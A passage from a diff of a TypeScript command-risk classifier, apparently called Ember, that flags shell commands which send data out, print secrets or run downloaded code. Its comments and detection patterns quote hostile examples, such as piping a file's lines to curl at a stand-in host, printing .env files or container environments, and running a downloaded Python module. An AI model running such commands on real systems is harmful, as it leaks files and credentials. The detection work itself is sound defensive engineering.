+function payloadSends(h: H, ops: readonly Arg[]): boolean {
+  const key = (w: string) => programName(w, { os: h.sc.os, family: h.sc.family, wsl: h.sc.wsl, mountRoot: h.sc.mountRoot }).key;
+  let wrapped = false;
+  for (let k = 0; k < ops.length; k++) {
+    const v = ops[k].v;
+    if (v === null) return false;
+    const name = key(v);
+    if (FETCHERS.has(name)) return true;
+    if (POSIX_SHELLS[name] !== undefined) {
+      const c = ops.findIndex((a, j) => j > k && a.v !== null && /^-[A-Za-z]*c[A-Za-z]*$/.test(a.v));
+      // Text Ember can't resolve (`"curl $0"` in double quotes) is read as written.
+      const text = c < 0 ? null : ops[c + 1]?.v ?? ops[c + 1]?.raw ?? null;
+      return text !== null && SENDER_IN_TEXT.test(text);
+    }
+    if (WRAPPERS[name] !== undefined || SUDO_LIKE.has(name) || name === "env" || name === "command" || name === "builtin") { wrapped = true; continue; }
+    if (!wrapped) return false;
+  }
+  return false;
+}
+
 reg(NATIVE, ["xargs"], h => {
   // GNU's -l, -i and -e (and --max-lines, --replace, --eof) take a value only attached or after =: written alone, the
   // next word is the command (commands-remote-c4-1). BSD's -J, -R and -S take one.
@@ -5893,10 +6136,10 @@ reg(NATIVE, ["xargs"], h => {
   const repl = values(p, "I", "replace", "i", "J")[0] ?? (has(p, "i", "replace") ? "{}" : undefined);
   const ops = p.operands.length ? p.operands : [lit("echo")];
   // Input Ember can't see put inside a longer word of a program that sends leaves the computer in its address or a
-  // header (`cat notes.txt | xargs -I{} curl https://x.io/{}`: commands-classes-y9-6); a list of addresses fetched
-  // one by one (`xargs -I{} curl -O {}`) is as before.
-  if (repl && typeof h.s.stdinText !== "string" && ops[0].v !== null && FETCHERS.has(programName(ops[0].v, { os: h.sc.os, family: h.sc.family, wsl: h.sc.wsl, mountRoot: h.sc.mountRoot }).key)
-    && ops.slice(1).some(a => a.v !== null && a.v !== repl && a.v.includes(repl))) h.e.add("publish", "send.contents", "May send what a file or a command holds to another computer.");
+  // header (`cat notes.txt | xargs -I{} curl https://x.io/{}`: commands-classes-y9-6), and so does input it can't see
+  // handed to one as its words: another program may have built the addresses from a file (`sed "s|^|https://x.io/|"
+  // notes.txt | xargs curl`, commands-remote-r10-3).
+  sendsInput(h, ops, values(p, "a", "arg-file").length > 0, repl === undefined || repl === "" ? null : new RegExp(repl.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
   // A here-string whose variables Ember follows (`xargs rm -rf <<< "$d"`): its pieces stand where the input goes, so the
   // command judges the variable's values as it uses them (commands-remote-w5-5).
   const fed = values(p, "a", "arg-file").length ? undefined : h.s.stdinVars?.word?.parts;
@@ -6031,6 +6274,7 @@ reg(NATIVE, ["parallel"], h => {
   const sc = wd === undefined ? h.sc : child(h.sc, { cwd: wd === null || !h.sc.cwd ? null : resolveTargetPath(wd, { os: h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd }) }, more(h.sc));
   // A here-string's variables stand for the input, as with xargs (commands-remote-w5-5).
   const fed = values(p, "a", "arg-file").length ? undefined : h.s.stdinVars?.word?.parts;
+  sendsInput(h, p.operands, values(p, "a", "arg-file").length > 0 || h.args.some(a => a.v !== null && /^::::\+?$/.test(a.v)), /\{[^{}\s]*\}/);
   h.e.payload([...p.operands, { v: null, raw: "(input)", glob: false, ...(fed ? { parts: fed } : {}) }], sc, "parallel");
 });
 
@@ -6469,6 +6713,8 @@ reg(NATIVE, ["sed", "gsed"], h => {
   for (const f of scriptFiles) if (f) h.e.usePath(lit(f), "read", h.sc);
   // A sed program file this task downloaded runs code (its `e`, `w`/`r` commands): download-and-run (commands-remote-r8-2).
   if (scriptFiles.some(f => f !== null && h.e.isDownloaded(lit(f), h.sc))) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
+  // Any other is read first and judged as `-e`'s text (r10-commands-x10-6).
+  for (const f of scriptFiles) if (f !== null && !STDIN_NAME.test(f) && !STREAM_NAME.test(f)) h.e.recordScript(lit(f), "sed", h.sc);
   if (scripts.length === 0 && scriptFiles.length === 0) { scripts = [files[0]?.v ?? null]; files = files.slice(1); }
   for (const s of scripts) if (s === null || !sedScriptOk(s)) h.e.unclear("unclear.sed-script", "Its sed script can run commands or write files Ember can't see.");
   if (scripts.some(s => s === null || !sedScriptOk(s)) && typeof h.s.stdinText === "string") h.e.judgeInput(h.s.stdinText, h.sc);
@@ -6549,6 +6795,10 @@ reg(NATIVE, ["awk", "gawk", "mawk", "nawk"], h => {
   // `awk -f -` / `-f /dev/stdin` reads its program from stdin: judge the seen text, else ask (review #166).
   if (progFiles.some(f => f === null || STDIN_NAME.test(f))) fromStdin(h, t => { if (!awkProgramOk(t)) h.e.unclear("unclear.awk-program", "Its awk program can run commands or write files."); });
   else if (progFiles.some(f => f !== null && STREAM_NAME.test(f))) h.e.unclear("unclear.script-stream", SAYS.scriptStream);
+  // Its program files are read first and judged as program text (r10-commands-x10-6); a library -l loads is a program.
+  for (const f of values(p, "f", "file", "i", "include", "E", "exec")) {
+    if (f !== null && !STDIN_NAME.test(f) && !STREAM_NAME.test(f) && !/^inplace(\.awk)?$/.test(f)) h.e.recordScript(lit(f), "awk", h.sc);
+  }
   let files = p.operands;
   const inline = values(p, "e", "source");
   if (progFiles.length === 0 && inline.length === 0) { inline.push(files[0]?.v ?? null); files = files.slice(1); }
@@ -6639,6 +6889,15 @@ function intoInterpreter(h: H, readAs?: ScriptRef["as"]): void {
 }
 
 /** A script given to an interpreter or shell: judged by name, refused if Ember's, escape if downloaded in this task. */
+/**
+ * What pytest loads as code: the conftest.py in its folder and the test files it is given (`pytest test_a.py`), each
+ * code Ember doesn't read, so one the task wrote asks (r10-commands-x10-6). A test it finds by itself isn't named.
+ */
+function pytestCode(h: H, args: readonly Arg[]): void {
+  if (h.e.readsAsMain || h.sc.cwd === null) return;
+  h.e.recordScript(lit("conftest.py"), "code", h.sc);
+  for (const a of args) if (a.v !== null && !a.v.startsWith("-") && /\.py(::\S*)?$/.test(a.v)) h.e.recordScript(lit(a.v.replace(/::.*$/, "")), "code", h.sc);
+}
 function runScript(h: H, script: Arg, readAs?: ScriptRef["as"]): void {
   if (script.v === null) {
     if (script.fetch) h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
@@ -6660,6 +6919,9 @@ function runScript(h: H, script: Arg, readAs?: ScriptRef["as"]): void {
   // Read first all the same, unless the task's record holds it (recordScript); a folder's entry file, a name an
   // interpreter completes or a pattern that is a download is not this file.
   if (readAs !== undefined && !hit) h.e.recordScript(script, readAs, h.sc);
+  // A folder's entry file is code too (`python3 pkg` runs pkg/__main__.py): one the task wrote asks (r10-commands-y10-5).
+  const entries = /^(python|pypy|py$)/.test(h.key) ? ["__main__.py"] : /^node/.test(h.key) ? ["index.js", "index.mjs", "index.cjs"] : [];
+  if (readAs !== undefined && !script.glob && (/(^|\/)\.{1,2}$|\/$/.test(script.v) || !/\.[^./]+$/.test(folder))) for (const n of entries) h.e.recordImplied(lit(`${folder}/${n}`), h.sc);
   nameCheck(h, script.v, script.v);
   handedToScript(h, script);
 }
@@ -6708,17 +6970,30 @@ function venvClear(h: H, args: readonly Arg[], wrapper: string): void {
 }
 
 /**
+ * The words after `-m <module>`, which belong to the module, wherever `-m` sat: alone, with the module attached
+ * (`-mtwine`) or at the end of a cluster of python's own flags (`-Im twine`, `-OOmtwine`): GNU-style, as python reads
+ * it (commands-remote-r10-1). Null when no `-m` was parsed.
+ */
+function afterModule(h: H, p: Parsed): Arg[] | null {
+  const o = p.opts.find(x => x.name === "-m" && x.value !== undefined);
+  const word = o ? h.args[o.at]?.v : undefined;
+  if (!o || word === null || word === undefined) return null;
+  // The module is attached when anything follows the cluster's m; else it is the next word.
+  const attached = word.slice(word.indexOf("m", 1) + 1) !== "";
+  return h.args.slice(o.at + (attached ? 1 : 2));
+}
+
+/**
  * `python -m <module> …` runs a tool by its name (commands-remote-r9-3): the tool's own row decides, as if the line
  * were `<module> …` (`python3 -m twine upload dist/*` publishes, `python3 -m keyring get …` prints a password,
  * `python3 -m sqlite3 a.db 'drop table x'` changes a database), and a tool Ember doesn't know asks as that program
  * would (`unknown.program`, named by the module for the user's words to match). Python's own everyday modules and the
  * project's test and build tools run as before; what the interpreter's row asks for is kept beside it.
  */
-function pythonModule(h: H, mod: string): void {
+function pythonModule(h: H, p: Parsed, mod: string): void {
   if (h.e.readsAsMain) return;
-  const at = h.args.findIndex(a => a.v === "-m" || a.v === `-m${mod}`);
-  if (at < 0) return;
-  const rest = h.args.slice(at + (h.args[at].v === "-m" ? 2 : 1));
+  const rest = afterModule(h, p);
+  if (rest === null) return;
   if (mod === "venv") { venvClear(h, rest, "python -m venv"); return; }
   if (PY_OWN_MODULES.has(mod) || PY_TOOL_MODULES.has(mod)) return;
   // The command a module's tool goes by: its own name, or with dashes for underscores (`pre_commit`, `pip_audit`).
@@ -6762,6 +7037,8 @@ reg(NATIVE, Object.keys(INTERPRETERS).filter(k => !["awk", "gawk", "mawk", "nawk
     }
   }
   if (h.key === "osascript" && p.operands[0]) { h.e.unclear("unclear.script", "It runs a script Ember can't see."); return; }
+  // A script file it runs, or reads from its input, is code Ember doesn't read: one this task wrote asks (judgeScripts).
+  const readAs: ScriptRef["as"] = "code";
   // node's --env-file loads that file's settings, secrets included, into the program's environment.
   for (const f of values(p, "env-file", "env-file-if-exists")) if (f) h.e.usePath(lit(f), "read", h.sc);
   if (h.key === "php" && h.args.some(a => a.v !== null && a.v.startsWith("-S"))) {
@@ -6776,29 +7053,43 @@ reg(NATIVE, Object.keys(INTERPRETERS).filter(k => !["awk", "gawk", "mawk", "nawk
   const mod = values(p, "m")[0];
   if (mod !== undefined && /^python|^pypy|^py$/.test(h.key)) {
     if (mod === "pip" || mod === "pip3") {
+      pip({ ...h, key: "pip", args: afterModule(h, p) ?? [] });
+      // As main read it too where that differs (`-Im pip`: every word, its cluster included, was pip's), so no way of
+      // writing it decides less safely than it did there (commands-remote-r10-1).
       const at = h.args.findIndex(a => a.v === "-m" || a.v === `-m${mod}`);
-      const rest = h.args.slice(at + (h.args[at]?.v === "-m" ? 2 : 1));
-      pip({ ...h, key: "pip", args: rest });
+      const was = h.args.slice(at + (h.args[at]?.v === "-m" ? 2 : 1));
+      if (at < 0) pip({ ...h, key: "pip", args: was });
       return;
     }
     if (mod === "timeit" || mod === "code" || mod === "pdb") { h.e.unclear("unclear.inline-code", "It runs code given on the command line."); return; }
     if (mod === "ensurepip") { h.e.add("system", "pkg.language", "Installs packages (they can run their own setup code)."); return; }
     if (mod === "http.server" || mod === "SimpleHTTPServer" || mod === "CGIHTTPServer") {
       // A web server for a folder (this one by default) on every address unless --bind says otherwise (review #178).
-      const at = h.args.findIndex(a => a.v === "-m" || a.v === `-m${mod}`);
-      const q = parseOpts(h.args.slice(at + (h.args[at]?.v === "-m" ? 2 : 1)), { shortValue: "bdp", longValue: ["bind", "directory", "protocol"] });
+      const q = parseOpts(afterModule(h, p) ?? [], { shortValue: "bdp", longValue: ["bind", "directory", "protocol"] });
       const bind = values(q, "b", "bind").pop();
       listens(h, bind === undefined ? "" : bind, servedRoot(values(q, "d", "directory").pop()));
       return;
     }
-    // zipfile and tarfile -e unpack into the folder given last (review #169).
-    if ((mod === "zipfile" || mod === "tarfile") && h.args.some(a => a.v === "-e" || a.v === "--extract") && p.operands.length >= 2) {
-      const to = p.operands[p.operands.length - 1];
+    // zipfile and tarfile -e unpack into the folder given last (review #169), over what is there: outside the work tree
+    // (the home folder's dotfiles), or into a folder Ember can't name, that asks as `unzip -d` and `tar -C` do, and a
+    // downloaded archive's files are downloads where they land (commands-remote-r10-7).
+    // tarfile's folder is optional and defaults to the current one, as `tar xf`'s does (r10-commands-y10-1).
+    const tarHere = mod === "tarfile" && p.operands.length === 1;
+    if ((mod === "zipfile" || mod === "tarfile") && h.args.some(a => a.v === "-e" || a.v === "--extract") && (p.operands.length >= 2 || tarHere)) {
+      const to = tarHere ? lit(".") : p.operands[p.operands.length - 1];
       if (to.v === null) h.e.add("destroy", "redirect.overwrite", "Writes to files Ember can't name.");
       else writeInto(h, to.v);
+      const margs = afterModule(h, p) ?? [];
+      const at = margs.findIndex(a => a.v === "-e" || a.v === "--extract");
+      const [arc, dir] = at >= 0 ? [margs[at + 1], tarHere ? lit(".") : margs[at + 2]] : [undefined, undefined];
+      const into = dir === undefined || dir.v === null ? null : h.e.usePath(dir, "write", h.sc);
+      if (into === null || into.abs === null || !inWorkTree(into.abs, h.sc.path)) {
+        h.e.add("destroy", "archive.unpack", `Unpacks ${arc?.v ?? "an archive"} over files in ${into === null ? "a folder Ember can't name" : into.text === "." ? thisFolder(h, into) : into.text}.`, into === null ? {} : { objects: [into] });
+      }
+      if (arc && h.e.isDownloaded(arc, h.sc) && into?.abs) h.e.downloads.push(into.abs);
     }
     if (mod) nameCheck(h, mod);
-    if (mod) pythonModule(h, mod);
+    if (mod) pythonModule(h, p, mod);
     // A module of this task's download (`curl … > x.py; python3 -m x`), or tests it downloaded that pytest or unittest
     // finds (conftest.py, test_x.py): it runs the download (commands-remote-c2-2).
     if (mod && /^[A-Za-z_][\w.]*$/.test(mod)) {
@@ -6809,6 +7100,15 @@ reg(NATIVE, Object.keys(INTERPRETERS).filter(k => !["awk", "gawk", "mawk", "nawk
         || (/^(pytest|unittest|nose2?|doctest)$/.test(mod) && h.sc.cwd !== null && h.e.downloadedProjectFile(h.sc.cwd, h.sc))
         || (h.sc.cwd === null && h.e.holdsAnyDownload());
       if (runsDownload) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
+      // A module the task wrote in this folder (`python3 -m a` after writing a.py) is code Ember doesn't read: it asks
+      // (judgeScripts), and so does a conftest.py or a test file it wrote that pytest loads (r10-commands-x10-6).
+      // Python's own and the everyday tools' modules are found where they are installed.
+      // A package runs its __main__.py after its __init__.py (r10-commands-y10-5).
+      if (!PY_OWN_MODULES.has(mod) && !PY_TOOL_MODULES.has(mod)) {
+        h.e.recordScript(lit(`${file}.py`), "code", h.sc);
+        for (const f of [`${file}/__main__.py`, `${file}/__init__.py`]) h.e.recordImplied(lit(f), h.sc);
+      }
+      if (mod === "pytest") pytestCode(h, afterModule(h, p) ?? []);
     }
     h.e.readArgs(p.operands, h.sc);
     return;
@@ -6819,6 +7119,8 @@ reg(NATIVE, Object.keys(INTERPRETERS).filter(k => !["awk", "gawk", "mawk", "nawk
       if (!r) continue;
       h.e.usePath(lit(r), "read", h.sc);
       if (/^(\.{1,2}[\\/]|[\\/]|~)/.test(r) && h.e.isDownloaded(lit(r), h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
+      // One the task wrote is code Ember doesn't read: it asks, as `node a.js` does (r10-commands-y10-5).
+      if (/^(\.{1,2}[\\/]|[\\/]|~)/.test(r)) h.e.recordImplied(lit(r), h.sc);
     }
     // `node --run <script>` runs a package.json script, judged by its name like `npm run`.
     const run = values(p, "run");
@@ -6827,7 +7129,7 @@ reg(NATIVE, Object.keys(INTERPRETERS).filter(k => !["awk", "gawk", "mawk", "nawk
   const script = p.operands[0];
   if (script) {
     if (/^(deno|bun)$/.test(h.key) && script.v && URL_LIKE.test(script.v)) { h.e.add("escape", "escape.npx", SAYS.downloadsProgram); packageLine(h, p.operands, h.key); return; }
-    runScript(h, script);
+    runScript(h, script, readAs);
     if (script.v !== null) scriptVerbs(h, script.v, p.operands.slice(1));
     h.e.readArgs(p.operands.slice(1), h.sc);
     return;
@@ -6836,7 +7138,7 @@ reg(NATIVE, Object.keys(INTERPRETERS).filter(k => !["awk", "gawk", "mawk", "nawk
   // Options that make it finish without a program: a version or help, and `node --test` (the work tree's tests).
   if (isNode && has(p, "test")) return;
   if (h.s.stdin === null && h.args.some(a => a.v !== null && (FINISHING.has(a.v) || (FINISHING_SHORT[h.key] ?? []).includes(a.v)))) return;
-  intoInterpreter(h);
+  intoInterpreter(h, readAs);
 });
 
 /** Interpreter options that print and finish (with no program and nothing on stdin). */
@@ -7165,6 +7467,8 @@ reg(NATIVE, Object.keys(WRAPPERS), h => {
   if (h.key === "strace" && values(p, "u").length) h.e.add("system", "system.sudo", "Runs as another user.");
   rest = rest.slice(rule.positional ?? 0);
   if (rest.length === 0) {
+    // `exec > a.sh` sends everything printed after it into a.sh (commands-remote-r10-5).
+    if (h.key === "exec") for (const r of h.s.redirs) if ((r.kind === "write" || r.kind === "append") && r.target && !/^[02-9]/.test(r.op)) h.e.execOut.push(r.target);
     if (rule.aloneInteractive) h.e.unclear("unclear.interactive", SAYS.interactive);
     return;
   }
@@ -7305,6 +7609,19 @@ reg(NATIVE, ["git"], h => {
   const rest = h.args.slice(g.verbAt + 1);
   if (h.args.some(a => /^ext::/i.test(a.v ?? "")) || (GIT_ADDRESS_VERBS.has(verb) && rest.some(a => GIT_HELPER_ADDRESS.test(a.v ?? "")))) h.e.unclear("unclear.git-ext", GIT_EXT_SAYS);
   const gh: H = { ...h, sc, args: rest, shellSc: h.shellSc ?? h.sc };
+  // A file of a commit or of the index printed whole (`git show HEAD:.env`, `git cat-file -p :.env`), or a path whose
+  // changes are printed (`git log -p -- .env`), is read as that file is: a secret's asks (commands-remote-r10-6). And
+  // a search of the tree for a secret's word prints the lines that hold one.
+  if (/^(show|cat-file|log|diff|blame|annotate|whatchanged|grep|diff-tree|range-diff|format-patch)$/.test(verb)) {
+    const dash = rest.findIndex(a => a.v === "--");
+    rest.forEach((a, k) => {
+      if (a.v === null || isOption(a)) return;
+      const blob = /^[^:\s/]*:(?!\/\/)(.+)$/.exec(a.v);
+      if (blob) h.e.usePath(lit(blob[1]), "read", sc);
+      else if (dash >= 0 && k > dash) h.e.usePath(a, "read", sc);
+    });
+    if (verb === "grep") secretSearch(h, rest);
+  }
   const fn = GIT[verb];
   if (fn) { fn(gh, widen); return; }
   if (!GIT_READ.has(verb)) { h.e.unclear("unclear.git-verb", "Ember can't tell which git command this runs (an alias or an add-on)."); return; }
@@ -7388,6 +7705,7 @@ git(["remote"], h => {
 git(["apply", "am"], h => {
   const files = h.args.filter(a => !isOption(a));
   h.e.readArgs(files, h.sc);
+  for (const f of [...files, ...h.s.redirs.flatMap(r => (r.kind === "read" && r.target ? [r.target] : []))]) h.e.notePatch(f, h.sc);
   if (h.args.some(a => /^--(check|stat|numstat|summary|show-current-patch|abort|skip|quit)$/.test(a.v ?? ""))) return;
   if (appliesDownload(h, files)) h.e.markUnnamed(".", h.sc);
 });
@@ -7686,6 +8004,9 @@ git(["archive"], h => {
   const remote = values(p, "remote").length > 0;
   if (remote) h.e.pipe.fetch = true;
   for (const o of values(p, "o", "output")) if (o) { const obj = h.e.usePath(lit(o), "write", h.sc); if (obj.abs) { h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); if (remote) h.e.download(o, h.sc); } }
+  // The paths after the tree are read as those files are, so a secret's asks as `git show HEAD:.env` does
+  // (r10-commands-y10-7).
+  if (!remote) for (const a of p.operands.slice(1)) if (a.v !== "--") h.e.usePath(a, "read", h.sc);
 });
 git(["lfs"], h => {
   const sub = h.args[0]?.v;
@@ -7900,6 +8221,23 @@ reg(NATIVE, ["hg"], h => {
 reg(NATIVE, ["bzr", "brz"], h => { if (/^(push|send|commit|ci)$/.test(h.args[0]?.v ?? "")) h.e.add("publish", "bzr.push", "Sends changes to another repository."); });
 
 // Containers (§3.5.1, §3.5.2, §3.5.5).
+/**
+ * Whether `docker inspect`'s words print the environment: no --format (the whole JSON), or a format that names Env,
+ * Config, the whole object (`{{.}}`, `{{json .}}`) or one Ember can't read (commands-remote-r10-6).
+ */
+function inspectShowsEnv(rest: readonly Arg[]): boolean {
+  const formats: (string | null)[] = [];
+  for (let k = 0; k < rest.length; k++) {
+    const v = rest[k].v;
+    if (v === null) continue;
+    if (v === "-f" || v === "--format") formats.push(rest[k + 1]?.v ?? null);
+    else if (v.startsWith("--format=")) formats.push(v.slice(9));
+    else if (/^-f./.test(v)) formats.push(v.slice(2));
+  }
+  if (formats.length === 0) return true;
+  return formats.some(f => f === null || /env|config|secret|label|\{\{\s*(json\s+)?\.\s*\}\}|\bjson\s+\.\s*\}|\.Spec\b/i.test(f));
+}
+
 reg(NATIVE, ["docker", "podman", "nerdctl", "docker-compose", "podman-compose"], h => {
   const prog = h.key === "docker-compose" ? "docker" : h.key === "podman-compose" ? "podman" : h.key;
   const isCompose = h.key.endsWith("-compose");
@@ -7947,10 +8285,13 @@ reg(NATIVE, ["docker", "podman", "nerdctl", "docker-compose", "podman-compose"],
     const ops = rest.filter(a => !isOption(a));
     const [src, dst] = ops;
     const remote = (a: Arg | undefined): boolean => !!a?.v && /^[A-Za-z0-9_.-]+:/.test(a.v) && !/^[A-Za-z]:[\\/]/.test(a.v);
+    // A one-letter container is a drive only on Windows: `c:/a.py` elsewhere is container c's file, so what it copies
+    // out is a download too (commands-remote-r10-5). Only the mark: the copy is judged as before, as a local path.
+    const container = (a: Arg | undefined): boolean => remote(a) || (!!a?.v && h.sc.path.flavour !== "win32" && /^[A-Za-z]:[\\/]/.test(a.v));
     if (src && !remote(src)) h.e.usePath(src, "readTree", h.sc);
     if (dst && !remote(dst)) { const obj = h.e.usePath(dst, "write", h.sc); if (obj.abs) h.e.add("destroy", "posix.cp", `Replaces ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); }
     // A file copied out of a container is a download where it lands (commands-remote-r7-3).
-    if (dst && !remote(dst) && src && (remote(src) || src.v === null)) { if (dst.v) h.e.download(dst.v, h.sc); else h.e.markUnnamed(null, h.sc); }
+    if (dst && !remote(dst) && src && (container(src) || src.v === null)) { if (dst.v) h.e.download(dst.v, h.sc); else h.e.markUnnamed(null, h.sc); }
     return;
   }
   if (v === "save" || v === "export") { for (const o of values(parseOpts(rest, { shortValue: "o", longValue: ["output"] }), "o", "output")) if (o) { const obj = h.e.usePath(lit(o), "write", h.sc); if (obj.abs) h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); } return; }
@@ -7964,6 +8305,9 @@ reg(NATIVE, ["docker", "podman", "nerdctl", "docker-compose", "podman-compose"],
     return;
   }
   if (group === "network" && /^(create|connect|disconnect)$/.test(v)) return;
+  // inspect prints a container's or an image's settings, its environment (passwords and tokens) among them, unless
+  // its --format picks only parts that hold none (commands-remote-r10-6).
+  if (v === "inspect" && inspectShowsEnv(rest)) { h.e.add("secret", "secret.env", SAYS.env); return; }
   if (["ps", "images", "inspect", "logs", "top", "stats", "version", "info", "history", "search", "events", "port", "diff", "wait", "pull", "build", "tag", "load", "import", "commit", "start", "unpause", "rename", "update", "ls", "df", "use", "show", "help", "--help", "scan", "sbom", "init", "debug", "volumes", "bake"].includes(v)) {
     if (v === "start" && rest.some(a => /^-[a-z]*i/.test(a.v ?? "") || a.v === "--interactive")) h.e.unclear("unclear.interactive", SAYS.interactive);
     return;
@@ -8080,6 +8424,9 @@ function compose(h: H, prog: string, rest: Arg[]): void {
   if (sub === "stop" || sub === "restart" || sub === "pause") { h.e.add("system", "kill.process", "Stops programs that are running (containers)."); return; }
   if (sub === "push") { h.e.add("publish", `${prog}.push`, "Pushes the images it builds.", { program: `${prog} compose push` }); return; }
   if (sub === "exec") { h.e.payload(subRest.slice(1), h.sc, `${prog} compose exec`); return; }
+  // config prints the file with its .env's values filled in, passwords too, unless it only lists names
+  // (commands-remote-r10-6).
+  if (sub === "config" && !subRest.some(a => /^(--services|--volumes|--profiles|--images|--networks|--hash|-q|--quiet)$/.test(a.v ?? ""))) { h.e.add("secret", "secret.env", SAYS.env); return; }
   if (["ps", "logs", "config", "build", "pull", "images", "top", "ls", "version", "port", "events", "convert", "ls", "wait", "watch", "stats", "cp", "attach", "scale", "unpause", "alpha", "help"].includes(sub)) return;
   h.e.unclear("unclear.docker-verb", "Ember can't tell which container command this runs.");
 }
@@ -8095,6 +8442,97 @@ const CLOUD_CHANGE = /^(?:s3 \S+|(?:create|update|put|set|run|start|stop|reboot|
  * they read only as the last word or in CLOUD_READ_PHRASES.
  */
 const CLOUD_PATH_READ = new Set(["get", "list", "describe", "show", "logs", "top", "plan", "version", "status", "whoami", "explain", "diff", "help"]);
+/**
+ * A cloud tool's command that prints the secrets a service keeps for an app (commands-remote-c10-1): Pulumi's
+ * `--show-secrets` and `config get`, Heroku's `config`, Netlify's `env:list`/`env:get`, Vercel's `env ls`/`env pull`,
+ * Firebase's config and secrets, gcloud's `secrets versions access`, and an environment printed by a command run in a
+ * pod or an app (`kubectl exec pod -- env`, `heroku run env`, `fly ssh console -C env`).
+ */
+function cloudPrintsSecrets(key: string, verbs: readonly string[], rest: readonly Arg[], ctx: ClassifyContext): boolean {
+  const words = rest.map(a => (a.v ?? "").toLowerCase());
+  if (words.some(w => w === "--show-secrets" || w.startsWith("--show-secrets="))) return true;
+  const [v0 = "", v1 = "", v2 = ""] = verbs;
+  if (key === "pulumi" && v0 === "config" && v1 === "get") return true;
+  if (key === "heroku" && (v0 === "config" || v0 === "config:get" || v0 === "config:pull")) return true;
+  if ((key === "netlify" || key === "ntl") && /^env:(list|get|pull|export)$/.test(v0)) return true;
+  if (key === "vercel" && v0 === "env" && /^(ls|list|pull|get)$/.test(v1)) return true;
+  if (key === "firebase" && /^(functions:config:get|functions:secrets:access|apphosting:secrets:access)$/.test(v0)) return true;
+  if (key === "gcloud" && v0 === "secrets" && v1 === "versions" && v2 === "access") return true;
+  // What runs there: after `--` (kubectl, oc: its words as given), after `run` and its options (heroku: joined and run
+  // by a shell), or fly's -C/--command (shell text), judged as a command line of its own.
+  const dash = rest.findIndex(a => a.v === "--");
+  if ((key === "kubectl" || key === "oc") && (v0 === "exec" || v0 === "debug") && dash >= 0) return remotePrintsSecrets(rest.slice(dash + 1).map(argWord).join(" "), ctx);
+  if (key === "heroku" && v0 === "run") {
+    const at = rest.findIndex(a => (a.v ?? "").toLowerCase() === "run");
+    let k = at + 1;
+    for (; k < rest.length; k++) {
+      const w = rest[k].v;
+      if (w === null || !w.startsWith("-")) break;
+      if (w === "--") { k++; break; }
+      if (HEROKU_RUN_VALUE.test(w)) k++;
+    }
+    if (remotePrintsSecrets(rest.slice(k).map(a => a.v ?? a.raw).join(" "), ctx)) return true;
+  }
+  // fly's -C (attached too: `-Cenv`) and gcloud's `compute ssh --command` are shell text run there; one Ember can't
+  // read is taken as printing them (r10-commands-y10-8).
+  const fly = (key === "fly" || key === "flyctl") && v0 === "ssh";
+  if (fly || (key === "gcloud" && v0 === "compute" && v1 === "ssh")) {
+    for (let k = 0; k < rest.length; k++) {
+      const w = rest[k].v ?? "";
+      const cmd = w === "--command" || (fly && w === "-C") ? rest[k + 1]?.v ?? "env" : w.startsWith("--command=") ? w.slice(10) : fly && /^-C./.test(w) ? w.slice(2) : null;
+      if (cmd !== null && remotePrintsSecrets(cmd, ctx)) return true;
+    }
+  }
+  // Azure's run-command runs each word after --scripts as a line of shell (r10-commands-y10-8).
+  if (key === "az" && v0 === "vm" && v1 === "run-command") {
+    const at = rest.findIndex(a => a.v === "--scripts");
+    if (at >= 0) {
+      const lines: string[] = [];
+      for (let k = at + 1; k < rest.length && !(rest[k].v ?? "").startsWith("--"); k++) lines.push(rest[k].v ?? "env");
+      if (remotePrintsSecrets(lines.join("\n"), ctx)) return true;
+    }
+  }
+  return false;
+}
+
+/**
+ * Whether what a pod runs is text Ember can't read (r10-commands-y10-8): a word after `--` it can't resolve
+ * (`sh -c "$(cat x)"`), or a shell there fed this computer's input (`-i … -- sh < x.sh`, `cat x.sh | kubectl exec -i`).
+ */
+function podRunsUnread(key: string, verbs: readonly string[], rest: readonly Arg[], s: Simple): boolean {
+  if (!((key === "kubectl" || key === "oc") && (verbs[0] === "exec" || verbs[0] === "debug"))) return false;
+  const dash = rest.findIndex(a => a.v === "--");
+  if (dash < 0) return false;
+  const there = rest.slice(dash + 1);
+  if (there.some(a => a.v === null)) return true;
+  const stdin = rest.slice(0, dash).some(a => a.v !== null && /^(-[A-Za-z]*i[A-Za-z]*|--stdin(=true)?)$/.test(a.v));
+  return stdin && s.stdin !== null && there[0]?.v !== undefined && there[0].v !== null && POSIX_SHELLS[programName(there[0].v, { os: "linux", family: "posix", wsl: false, mountRoot: "" }).key] !== undefined;
+}
+
+/** heroku run's options that take a value written apart (`-a app`, `--size standard-2x`). */
+const HEROKU_RUN_VALUE = /^(-a|--app|-r|--remote|-s|--size|-e|--env|--type|-x|--exit-code-file)$/;
+/** A word as the shell would hand it on: plain, or single-quoted; one Ember can't resolve as written. */
+function argWord(a: Arg): string {
+  if (a.v === null) return a.raw;
+  return /^[\w@%+=:,./-]+$/.test(a.v) ? a.v : `'${a.v.replace(/'/g, "'\\''")}'`;
+}
+/**
+ * An environment printed by code given inline (`node -e 'console.log(process.env)'`, `python3 -c '…os.environ…'`), or
+ * the folders a container is handed its secrets in (Docker's and Kubernetes' `/run/secrets/`).
+ */
+const PRINTS_ENV = /^(\S*\/)?(env|printenv|set|export|declare)(\s|$)|environ|process\.env|\$env:|getenv|\bENV\b|%ENV|os\.Environ|(^|[\s'"=:])(\/var)?\/run\/secrets(\/|\s|$)/;
+/**
+ * Whether a command run in a pod or an app reads or prints secrets (r10-commands-x10-4): classified as a command line
+ * of its own, a secret's finding there (`sh -c env`, `cat .env`, `cat /run/secrets/db`) counts, and so does an
+ * environment printed by inline code. Only the secret is lifted: the rest runs on the other computer.
+ */
+function remotePrintsSecrets(text: string, ctx: ClassifyContext): boolean {
+  if (PRINTS_ENV.test(text.trim())) return true;
+  if (text.trim() === "" || text.length > 4096) return text.length > 4096;
+  const got = classifyCommand(text, "bash", { ...ctx, script: false });
